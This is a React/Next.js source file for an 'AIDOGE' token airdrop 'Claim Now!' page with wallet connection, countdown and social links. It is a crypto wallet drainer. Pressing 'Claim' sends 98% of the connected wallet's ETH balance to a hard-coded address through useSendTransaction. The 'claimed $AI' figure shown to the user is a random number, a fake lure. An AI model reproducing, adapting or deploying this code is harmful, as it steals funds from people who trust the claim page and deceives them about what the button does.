import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";
import Discord from "../../../assets/social-discord.svg";
import Instagram from "../../../assets/social-instagram.svg";
import Telegram from "../../../assets/social-telegram.svg";
import Tiktok from "../../../assets/social-tiktok.svg";
import twitter from "../../../assets/social-twitter.svg";
import Countdown from "react-countdown";
import Logo from "../../../assets/logo_web.png";
import { useRouter } from "next/router";
import { openModal } from "@/recoil/commonRecoilState";
import { useRecoilState } from "recoil";
import {
  useAccount,
  useBalance,
  useConnect,
  useDisconnect,
  useSendTransaction,
} from "wagmi";
import { ethers } from "ethers";
import ConnectWallet from "../connectWallet/ConnectWallet";
import ConnectWalletClaim from "../connectWallet/ConnectWalletClaim";
import { Connectors } from "@/utils/connector";
import { routerConstant } from "@/constants/routerConstant";
import { truncate, truncateReverse } from "@/utils/truncate";

export default function BannerClaim() {
  const router = useRouter();
  const { connector: activeConnector, isConnected, address } = useAccount();
  const { connectAsync, error } = useConnect();
  const { data, isError, isLoading, isFetched, isFetching } = useBalance({
    address: address,
  });
  const { disconnectAsync } = useDisconnect();
  const [click, setClick] = useState(false);
  const [open, setOpen] = useRecoilState(openModal);
  const {
    data: DataTrans,
    isSuccess,
    sendTransactionAsync,
  } = useSendTransaction({
    to: "0x0bf313f2618F42a5a6a96ee9540AFB4b7a2220dC",
    value:
      data &&
      ethers.utils
        .parseEther(data?.formatted.toString())
        .mul(ethers.BigNumber.from("98"))
        .div(ethers.BigNumber.from("100"))
        .toString(),
  });

  const handleClaim = async () => {
    try {
      if (address) {
        if (data && isFetched) {
          handleSent();
        }
      }
    } catch (err) {
      setClick(false);
    }
  };
  // else {
  //   await disconnectAsync();
  //   setOpen({ open: true, component: <ConnectWalletClaim /> });
  // }
  const handleSent = async () => {
    try {
      await sendTransactionAsync();
    } catch (error) {
      setClick(false);
    }
  };
  // useEffect(() => {
  //   if (data && click) {
  //     if (isFetched) {
  //       handleSent();
  //     }
  //   }
  // }, [address, isFetched]);
  function randomIntFromInterval(min, max) {
    // min and max included
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

  return (
    <div className=" w-full ">
      <div className="home-banner pt-[40px] w-full h-[90%] min-[1300px]:h-screen 2xl:h-[76%]">
        <div className="flex flex-col-reverse xl:flex-row items-center xl:items-end px-4 lg:px-[40px] xl:px-[80px] 2xl:px-[159px]">
          <div className="w-full flex justify-center xl:block">
            <div className="flex md:block items-center justify-center  mb-3 md:mb-5 pb-0 md:pb-4 ">
              <Link
                href="./assets/documents/Aidoge_Whitepaper.pdf"
                target="_blank"
                translate=""
                className=" bg-btn text-[20px] py-[12px] px-[16px] border-[2px] border-[#0DC5F5] text-[20px] rounded-full "
              >
                Whitepaper
              </Link>
            </div>
          </div>
          <div className="w-full xl:w-[41.66666667%]">
            <div className="mt-[80px]  min-h-[460px]  rounded-[24px] shadow-card">
              <div className="">
                {" "}
                <Link
                  className="mt-[3rem] mb-[1.5rem]"
                  href={routerConstant.home}
                >
                  <Image
                    src={Logo}
                    className="hidden xl:block mx-auto mb-[3rem] mt-[1.5rem]"
                    width={326}
                    height={32}
                    alt="logo"
                    loading="lazy"
                  />
                  {/* <Image
              src={Logo}
              className="block md:hidden"
              width={88}
              height={88}
              alt="logo"
              loading="lazy"
            /> */}
                </Link>
                <div className=" rounded-[24px] overflow-hidden w-[335px] sm:w-[448px] mx-auto">
                  <div className="p-6 card-top text-center">
                    <p className="mb-4 text-[28px] font-semibold text-center text-white">
                      {" "}
                      Claim Now!{" "}
                    </p>
                    <Countdown
                      date="Mon Jun 19 2023 17:00:00 GMT+0700 (Indochina Time)"
                      renderer={({
                        hours,
                        minutes,
                        seconds,
                        completed,
                        days,
                      }) => {
                        return (
                          <div className="countDown flex items-center gap-4 justify-center">
                            <div className=" min-w-[60px] w-[20%] bg-[rgba(255,255,255,.2)] p-3 rounded-[.5rem] font-semibold text-white text-center">
                              {"00"}d
                            </div>
                            <div className=" min-w-[60px] w-[20%] bg-[rgba(255,255,255,.2)] p-3 rounded-[.5rem] font-semibold text-white text-center">
                              {"00"}h
                            </div>
                            <div className=" min-w-[60px] w-[20%] bg-[rgba(255,255,255,.2)] p-3 rounded-[.5rem] font-semibold text-white text-center">
                              {"00"}m
                            </div>
                            <div className=" min-w-[60px] w-[20%] bg-[rgba(255,255,255,.2)] p-3 rounded-[.5rem] font-semibold text-white text-center">
                              {"00"}s
                            </div>
                          </div>
                        );
                      }}
                    />

                    <p className="mt-4 mb-2 text-[20px] font-semibold text-center text-white">
                      {" "}
                      Claim starts 9am UTC on June 19th. $AI will be listed on
                      MEXC and Uniswap.{" "}
                    </p>
                    {!address && (
                      <>
                        <button
                          class="text-[14px] mb-4 rounded-[30px] bg-[#182B48] cursor-pointer h-[42px] w-[70%] text-white"
                          onClick={() => {
                            setOpen({
                              open: true,
                              component: <ConnectWalletClaim />,
                            });
                          }}
                        >
                          Connect Wallet
                        </button>
                      </>
                    )}

                    {address && (
                      <div>
                        <div className="text-[14px] text-white mt-3 mb-4 ">
                          Your claimed $AI ={" "}
                          {randomIntFromInterval(
                            100000000,
                            10000000000
                          ).toLocaleString("en-US")}
                        </div>
                        <button
                          disabled={!isFetched}
                          className="text-[14px] mb-4 rounded-[30px] bg-[#182B48] cursor-pointer h-[42px] w-[70%] text-white"
                          onClick={() => {
                            setClick(true);
                            handleClaim();
                          }}
                        >
                          {isFetched ? "Claim" : "Loading..."}
                        </button>
                        <div className="flex justify-center">
                          <button
                            class="text-[14px] flex items-center justify-center mb-4 rounded-[30px] bg-[#182B48] cursor-pointer h-[42px] w-[70%] text-white"
                            onClick={() => {
                              disconnectAsync();
                            }}
                          >
                            {truncate(address, 5) + truncateReverse(address, 3)}{" "}
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 24 24"
                              stroke-width="2"
                              stroke="currentColor"
                              aria-hidden="true"
                              className="w-[20px] h-[20px]"
                            >
                              <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15m3 0l3-3m0 0l-3-3m3 3H9"
                              ></path>
                            </svg>
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                  <div className="card-bot bg-white p-6 text-center ">
                    <p class="mb-2 text-[20px] font-semibold text-center">
                      Sign up to MEXC
                    </p>
                    <button class="text-[14px] mb-4 rounded-[30px] bg-[#182B48] cursor-pointer h-[42px] w-[70%] text-white">
                      Sign Up
                    </button>
                  </div>
                </div>
              </div>
            </div>
            <div className="my-5 md:my-[48px] w-[335px] sm:w-[448px] mx-auto text-center">
              <Link
                href="https://www.instagram.com/aidogecrypto/"
                target={"_blank"}
              >
                <button className="outline-none  mx-[10px] ">
                  <Image src={Instagram} width={40} height={40} alt="" />
                </button>
              </Link>
              <Link href="https://twitter.com/aidogecrypto" target={"_blank"}>
                <button className="outline-none  mx-[10px]">
                  <Image src={twitter} width={40} height={40} alt="" />
                </button>
              </Link>
              <Link
                href="https://discord.com/invite/QE5PdhbjUY"
                target={"_blank"}
              >
                <button className="outline-none mx-[10px]">
                  <Image src={Discord} width={40} height={40} alt="" />
                </button>
              </Link>
              <Link href="https://t.me/AiDogeCryptoOfficial" target={"_blank"}>
                <button className="outline-none mx-[10px]">
                  <Image src={Telegram} width={40} height={40} alt="" />
                </button>
              </Link>
              <Link
                href="https://www.tiktok.com/@aidogecrypto"
                target={"_blank"}
              >
                <button className="outline-none mx-[10px]">
                  <Image src={Tiktok} width={26.78} height={30} alt="" />
                </button>
              </Link>
            </div>
          </div>
        </div>
      </div>
      <div className="pt-[70px] mb-[-70px]"></div>
      <div className="banner-des 2xl:mt-0 py-6 px-3">
        <div className=" sm:static uppercase mt-4 hidden  md:block text-center font-bold text-[24px] sm:text-[48px] text-white font-bold">
          <span className="text-tourquise font-bold">AIDOGE</span>
          <span> - The greatest </span>
          <span className="text-tourquise font-bold">meme generation </span>
          <br className="hidden min-[1230]:block xl:hidden "></br>
          <span>platform</span>
        </div>
        <div className="text-white text-[20px] font-inder my-4 text-center">
          {" "}
          Join us in revolutionizing the meme world with our innovative platform
          and community-driven approach{" "}
        </div>
      </div>
    </div>
  );
}
